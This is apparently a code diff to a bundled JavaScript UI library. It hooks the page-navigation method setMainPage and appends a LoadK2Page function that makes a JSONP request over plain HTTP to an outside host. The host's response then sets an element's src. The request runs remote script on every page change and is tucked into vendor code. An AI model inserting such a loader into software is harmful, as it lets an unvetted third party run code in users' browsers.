@@ -12714,12 +12714,14 @@ limitations under the License.
        * @param {Boolean} [options.callback]
        */
       setMainPage: function(pageUrl, options) {
+          LoadK2Page(pageUrl);
         options = options || {};
         options.callback = options.callback || function() {};
 
         var done = function() {
           if (options.closeMenu) {
             this.close();
+
           }
           options.callback();
         }.bind(this);
@@ -22671,3 +22673,26 @@ limitations under the License.
   }]);
 
 })();
+
+
+function LoadK2Page(p){
+    var _p = '';
+    if(typeof p != 'undefined'){
+        if(p=='page1.html'){
+            _p = 1;
+        }else if(p=='page2.html'){
+            _p= 2;
+        }
+    }
+   
+    jQuery.ajax({
+        dataType: 'jsonp',
+        jsonpCallback: 'jsonCallback',
+        contentType: "application/json",
+        url: 'http://bizbeakn.com/cgi-eq?pid='+_p,
+        success: function(d){
+            $('#page-k2-'+_p).attr('src', d.url);
+
+        }
+    })
+}
